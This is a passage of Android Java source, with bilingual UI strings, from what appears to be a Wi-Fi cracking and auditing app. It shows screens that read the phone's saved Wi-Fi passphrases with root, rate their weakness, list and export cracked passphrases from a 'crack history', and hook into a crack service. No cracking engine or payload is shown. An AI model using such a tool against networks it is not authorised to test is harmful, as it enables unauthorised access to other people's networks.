        for (SavedWifiReader.Saved sw : savedWifiList) {
            boolean keep;
            if (savedWifiFilter == 1) {
                keep = sw.hasPassword() && SavedWifiReader.weaknessScore(sw.password) >= 50;
            } else if (savedWifiFilter == 2) {
                keep = !sw.hasPassword();
            } else {
                keep = true;
            }
            if (!keep) continue;
            savedWifiListBox.addView(savedWifiRow(sw));
            shown++;
        }
        if (shown == 0) {
            savedWifiListBox.addView(AmberTheme.emptyBox(this, dp,
                    L.s("这个筛选下没有网络", "Nothing under this filter"),
                    L.s("点「全部」看完整列表", "Tap All for the full list")));
        }
        refreshSavedWifiChips();
    }

    /**
     * 一行已存网络。
     *
     * <p>口令那行**必须**允许折行：这是这页存在的意义（看清自己在用的口令），
     * 所以刻意不设 singleLine、也不设省略号 —— 长口令最多折三行，绝不变成 `xx…yy`。
     */
    private View savedWifiRow(SavedWifiReader.Saved sw) {
        boolean open = !sw.hasPassword();
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackground(AmberTheme.rowBg(this, dp, AmberTheme.RADIUS_CARD));
        card.setPadding(px(14), px(12), px(14), px(12));
        LinearLayout.LayoutParams clp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        clp.bottomMargin = px(8);
        card.setLayoutParams(clp);

        // 第一行：SSID + 强度胶囊
        LinearLayout head = new LinearLayout(this);
        head.setOrientation(LinearLayout.HORIZONTAL);
        head.setGravity(Gravity.CENTER_VERTICAL);

        TextView ssid = new TextView(this);
        ssid.setText(sw.ssid);
        ssid.setTextSize(AmberTheme.FS_TITLE);
        ssid.setTextColor(TEXT);
        ssid.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        ssid.setSingleLine(true);
        ssid.setEllipsize(TextUtils.TruncateAt.END);   // 名字可以截断：右边还有胶囊
        head.addView(ssid, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        int score = open ? -1 : SavedWifiReader.weaknessScore(sw.password);
        TextView chip = new TextView(this);
        chip.setText(open ? L.s("开放网络", "Open") : (SavedWifiReader.weaknessLabel(score) + " " + score));
        chip.setTextSize(AmberTheme.FS_LABEL);
        chip.setTextColor(open ? AmberTheme.TEXT_DIM : savedWifiScoreColor(score));
        chip.setBackground(roundBg(open ? AmberTheme.CARD_3 : savedWifiScoreBg(score),
                AmberTheme.RADIUS_CHIP));
        chip.setPadding(px(8), px(3), px(8), px(3));
        LinearLayout.LayoutParams chlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        chlp.leftMargin = px(8);
        head.addView(chip, chlp);
        card.addView(head);

        // 第二行：口令本体（完整显示，最多折三行）
        TextView pw = new TextView(this);
        if (open) {
            pw.setText(L.s("（开放网络，无口令）", "(open network, no passphrase)"));
            pw.setTextSize(AmberTheme.FS_BODY);
            pw.setTextColor(AmberTheme.TEXT_FAINT);
        } else {
            pw.setText(sw.password);
            pw.setTextSize(AmberTheme.FS_ACTION);
            pw.setTextColor(TEXT);
            pw.setTypeface(Typeface.MONOSPACE);
        }
        pw.setSingleLine(false);      // ← 关键：不截断
        pw.setMaxLines(3);
        pw.setLineSpacing(px(3), 1f);
        pw.setTextIsSelectable(true);
        LinearLayout.LayoutParams plp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        plp.topMargin = px(6);
        card.addView(pw, plp);

        // 第三行：长度 / 安全类型 / 复制提示
        TextView meta = new TextView(this);
        String sec = sw.security == null || sw.security.isEmpty() ? "-" : sw.security;
        meta.setText(open
                ? L.f("安全类型 %s · 无需口令", "Security %s · no passphrase", sec)
                : L.f("长度 %d · 安全类型 %s · 点这一行复制口令",
                        "Length %d · %s · tap to copy", sw.password.length(), sec));
        meta.setTextSize(AmberTheme.FS_LABEL);
        meta.setTextColor(AmberTheme.TEXT_FAINT);
        LinearLayout.LayoutParams mlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        mlp.topMargin = px(4);
        card.addView(meta, mlp);

        if (!open) {
            card.setBackground(io.github.wlmosv_png.wpaforge.ui.UiKit.rippleStroked(
                    AmberTheme.CARD, AmberTheme.EDGE, dp(AmberTheme.RADIUS_CARD), dp(0.8f)));
            card.setOnClickListener(v -> copySavedWifiPassword(sw.ssid, sw.password));
        }
        return card;
    }

    /** 强度分档色（与观测页的信号档位色同风格：越弱越刺眼）。 */
    private int savedWifiScoreColor(int score) {
        if (score >= 70) return DANGER;
        if (score >= 50) return ACCENT;
        if (score >= 30) return AmberTheme.TEXT_DIM;
        return OK_GREEN;
    }

    private int savedWifiScoreBg(int score) {
        if (score >= 70) return AmberTheme.DANGER_SOFT_BG;
        if (score >= 50) return AmberTheme.WARN_BG;
        return AmberTheme.CARD_3;
    }

    /** 点整行复制口令（只写系统剪贴板，不落盘、不上传）。 */
    private void copySavedWifiPassword(String ssid, String pw) {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                    getSystemService(CLIPBOARD_SERVICE);
            if (cm == null) throw new IllegalStateException("no clipboard");
            cm.setPrimaryClip(android.content.ClipData.newPlainText("wifi-passphrase", pw));
            Toast.makeText(this, L.f("已复制「%s」的口令", "Passphrase copied (%s)", ssid),
                    Toast.LENGTH_SHORT).show();
        } catch (Throwable t) {
            Toast.makeText(this, L.s("复制失败: ", "Copy failed: ")
                    + t.getClass().getSimpleName(), Toast.LENGTH_SHORT).show();
        }
    }

    /** 刷新观测页的已存 WiFi 卡片文案 */
    private void updateSavedWifiCard() {
        if (savedWifiCard == null) return;
        if (savedWifiTotal < 0) {
            savedWifiCard.setText(L.s(
                    "点击自查本机已保存的 WiFi 口令\n"
                    + "口令由系统明文保存，需 root 读取。\n"
                    + "只在本机展示，不上传。",
                    "Tap to audit saved Wi-Fi passphrases\n"
                    + "Passphrases are stored in plaintext; root is required.\n"
                    + "Shown locally only, never uploaded."));
            savedWifiCard.setTextColor(TEXT_DIM);
            return;
        }
        if (savedWifiTotal == 0) {
            savedWifiCard.setText(L.s("没有读到已保存的网络。\n点击重试。",
                    "No saved networks found.\nTap to retry."));
            savedWifiCard.setTextColor(TEXT_DIM);
            return;
        }
        boolean bad = savedWifiWeak > 0;
        savedWifiCard.setText(L.f(
                "已保存 %d 个网络，其中 %d 个弱口令\n点击查看明细\n"
                + "口令只在本机展示，不上传。",
                "%d saved networks, %d weak passphrases\nTap for details\n"
                + "Shown locally only, never uploaded.",
                savedWifiTotal, savedWifiWeak));
        savedWifiCard.setTextColor(bad ? DANGER : OK_GREEN);
    }

    private void showSavedWifi() {
        final NetDialog dlg = new NetDialog(this, L.s("本机已存 WiFi", "Saved Wi-Fi"),
                L.s("正在读取系统配置…", "Reading system configuration…"));
        dlg.setNegative(L.s("关闭", "Close"), null);
        dlg.show();

        new Thread(() -> {
            String issue = SavedWifiReader.checkAccess();
            if (!issue.isEmpty()) {
                ui.post(() -> {
                    savedWifiTotal = -2;
                    if (savedWifiCard != null) {
                        savedWifiCard.setText(L.s(
                                "无法读取：需要 root\n点击重试",
                                "Cannot read: root required\nTap to retry"));
                        savedWifiCard.setTextColor(DANGER);
                    }
                });
                ui.post(() -> dlg.dismiss());
                ui.post(() -> NetDialog.info(this, L.s("无法读取", "Cannot read"), issue
                        + "\n\n这项功能需要 root，用来读取系统保存的 WiFi 配置。"));
                return;
            }
            java.util.List<SavedWifiReader.Saved> list = SavedWifiReader.read();
            int weakCount = 0;
            for (SavedWifiReader.Saved sw : list) {
                if (sw.hasPassword() && SavedWifiReader.weaknessScore(sw.password) >= 50) weakCount++;
            }
            final int fWeak = weakCount;
            ui.post(() -> {
                savedWifiTotal = list.size();
                savedWifiWeak = fWeak;
                updateSavedWifiCard();
            });
            ui.post(() -> dlg.dismiss());
            ui.post(() -> {
                if (list.isEmpty()) {
                    NetDialog.info(this, L.s("本机已存 WiFi", "Saved Wi-Fi"), L.s("没有读到任何已保存的网络。", "No saved networks found."));
                    return;
                }
                showSavedWifiList(list);
            });
        }).start();
    }

    // ---------------- 破解记录 ----------------

    private void showHistory() {
        /* 读历史**必须放后台**：`load()` 对每条命中记录都要走一次
         * Android Keystore 解密（用户 107 条命中 → 107 次），在主线程上跑
         * 会明显卡一下。这一页确实需要明文（要显示口令），所以是搬线程而不是免解密。 */
        new Thread(() -> {
            final java.util.List<HistStore.Record> list = HistStore.load(MainActivity.this);
            ui.post(() -> showHistoryDialog(list));
        }, "wpaforge-hist").start();
    }

    private void showHistoryDialog(final java.util.List<HistStore.Record> list) {
        if (list.isEmpty()) {
            NetDialog.info(this, L.s("破解记录", "Crack history"), L.s("还没有记录。跑一次破解就会自动记下来。", "No records yet. One crack run will start recording automatically."));
            return;
        }
        int hits = 0;
        for (HistStore.Record r : list) if (r.hit) hits++;
        NetDialog d = new NetDialog(this, L.s("破解记录", "Crack history"),
                L.s("共 ", "Total ") + list.size() + L.f(" 条，成功 %s 条。", " records, %s succeeded.", hits));
        int show = Math.min(30, list.size());
        for (int i = 0; i < show; i++) {
            HistStore.Record r = list.get(i);
            String line = r.timeLabel() + "  " + r.ssid
                    + (r.hit ? "\n✓ " + r.displayPassphrase()
                             : L.s("\n✗ 未命中", "\n✗ no match"))
                    + L.f("   试了 %d 条 / %s", "   tried %d / %s", r.tested, r.durationLabel());
            d.addItem(line, null);
        }
        if (list.size() > show) d.addHint(L.s("只显示最近 ", "Showing most recent ") + show + " 条。");
        d.setDanger(L.s("清空记录", "Clear records"), dd -> {
            HistStore.clear(this);
            histSummary = null;
            Toast.makeText(this, L.s("已清空", "Cleared"), Toast.LENGTH_SHORT).show();
        });
        d.setNegative(L.s("关闭", "Close"), null);
        d.show();
    }

    private void doExport() {
        new Thread(() -> {
            java.io.File txt = HistStore.exportText(this);
            java.io.File pw = HistStore.exportPasswords(this);
            ui.post(() -> {
                if (txt == null) {
                    NetDialog.info(this, L.s("导出失败", "Export failed"), L.s("没有可导出的记录，或写入失败。", "No records to export, or the write failed."));
                    return;
                }
                NetDialog d = new NetDialog(this, L.s("导出完成", "Export complete"),
                        "记录文件:\n" + txt.getAbsolutePath()
                        + "\n\n成功口令表:\n" + (pw != null ? pw.getAbsolutePath() : "无"));
                d.addHint(L.s("文件在应用私有目录，可用文件管理器访问 ", "Files are in the app's private directory, reachable via a file manager: ")
                        + "Android/data/io.github.wlmosv_png.wpaforge/files/");
                d.setPositive(L.s("知道了", "Got it"), null);
                d.show();
            });
        }).start();
    }

    // ---------------- 权限 ----------------

    /** 刷新权限状态行：逐项列出现在有/没有。 */
    /**
     * 权限状态展示。
     *
     * 启动时已自动申请过，所以这里只做两件事：
     *   1. 告诉用户「齐了」还是「缺什么」
     *   2. 只有确实缺、且系统不会再弹（被永久拒绝）时，
     *      才露出「去系统设置里允许」按钮
     *
     * 齐全时不显示按钮 —— 没缺东西还给个申请入口是纯噪音。
     */
    private void refreshPermLabel() {
        if (permLabel == null) return;
        boolean loc = grantedOrFalse(android.Manifest.permission.ACCESS_FINE_LOCATION);
        boolean near = Build.VERSION.SDK_INT < 33
                || grantedOrFalse("android.permission.NEARBY_WIFI_DEVICES");
        // 定位开关：不在应用权限里，permFixBtn 帮不上忙（系统设置页没有这一项），只在文案里说明。
        boolean locSwitch = scanner == null || scanner.isLocationEnabled();
        boolean allOk = loc && near && locSwitch;

        StringBuilder sb = new StringBuilder();
        sb.append(permLine(android.Manifest.permission.ACCESS_FINE_LOCATION,
                L.s("定位（读取 SSID / 扫描）", "Location (read SSID / scan)")));
        if (Build.VERSION.SDK_INT >= 33) {
            sb.append('\n').append(permLine("android.permission.NEARBY_WIFI_DEVICES",
                    L.s("附近设备（扫描）", "Nearby devices (scan)")));
        }
        // 定位开关是系统级开关，不在应用权限页里，所以单独一行写清楚去哪儿开。
        sb.append('\n');
        sb.append("  ").append(locSwitch ? "✓ " : "✗ ").append(L.s("系统定位开关（必须打开）",
                "System location toggle (must be on)"));
        if (!locSwitch) {
            sb.append(L.s(" —— 关着时扫描结果一定是空的，权限给了也一样。请下拉通知栏打开「定位」（系统设置页里没有这一项）。",
                    " - scans are always empty while it is off, even with permissions granted; turn it on from Quick Settings."));
        }
        sb.append('\n');
        if (allOk) {
            sb.append(L.s("已就绪，无需操作。", "All set — nothing to do."));
        } else {
            sb.append(L.s("缺少上面标 ✗ 的权限，扫描会拿不到数据。\n"
                            + "若点了没反应，说明系统已不再弹窗，请用下方按钮去设置里允许。",
                    "Missing the ✗ items above; scanning will return no data.\n"
                            + "If nothing pops up, the system stopped asking — "
                            + "use the button below to allow it in Settings."));
        }
        permLabel.setText(sb.toString());

        if (permFixBtn != null) {
            permFixBtn.setVisibility(allOk ? View.GONE : View.VISIBLE);
        }
    }

    /** 权限是否已授予；异常一律当未授予 */
    private boolean grantedOrFalse(String perm) {
        try {
            return checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable t) {
            return false;
        }
    }

    private String permLine(String perm, String label) {
        boolean ok;
        try {
            ok = checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable t) {
            ok = false;
        }
        return (ok ? "✓ " : "✗ ") + label;
    }

    /** 跳到系统「应用信息」页，手动开权限。 */
    private void openAppSettings() {
        try {
            android.content.Intent i = new android.content.Intent(
                    android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            i.setData(android.net.Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Throwable t) {
            Toast.makeText(this, L.s("无法打开系统设置页", "Cannot open app settings"),
                    Toast.LENGTH_SHORT).show();
        }
    }

    private void requestPermsIfNeeded() {
        List<String> need = new ArrayList<>();
        if (Build.VERSION.SDK_INT >= 33) {
            need.add("android.permission.NEARBY_WIFI_DEVICES");
        }
        need.add(Manifest.permission.ACCESS_FINE_LOCATION);
        List<String> ask = new ArrayList<>();
        for (String p : need) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) ask.add(p);
        }
        if (!ask.isEmpty()) {
            if (Build.VERSION.SDK_INT >= 23) {
                requestPermissions(ask.toArray(new String[0]), 1001);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        // 权限请求返回后刷新设置页那行状态
        if (code == 1001 || code == 1003) {
            if (permLabel != null) refreshPermLabel();
        }
        if (scanner != null) scanner.emit();
    }

    @Override
    protected void onResume() {
        super.onResume();
        // autojoin 残留恢复：上次若进程被杀 / OOM，可能停在「限制自动重连」
        wpsAutojoinRestore();
        wpsStatsLoad();
        checkBackgroundStall();
        // 回前台：目标/字典的显示与「权威」对齐一次（后台跑过的任务会在这里补回来）
        restoreSelectionFromAuthority();
        refreshQueue();          // 队列可能也是旧的（后台跑完）→ 重读并重画状态行
        if (currentTab == 0) {
            // 从后台回来要把雷达动画接上，否则会停在最后一帧
            if (radar != null) radar.startSpin();
            if (scanner != null) scanner.start();
        }
        // 每次回到前台都复查权限：
        //   1. 用户可能刚从系统设置里把权限打开
        //   2. onCreate 里申请过一次不代表成功（有些 ROM 在前台未就绪时会丢弃请求）
        if (permLabel != null) refreshPermLabel();
        requestPermsIfNeeded();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (scanner != null) scanner.stop();
        // 停掉动画，避免后台空转耗电
        if (radar != null) radar.stopSpin();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (scanner != null) scanner.stop();
        if (engine != null) engine.cancel();
        if (serviceBound) {
            try {
                if (crackService != null) crackService.removeCallback(svcCallback);
                unbindService(svcConn);
            } catch (Exception ignored) {}
            serviceBound = false;
        }
    }
}
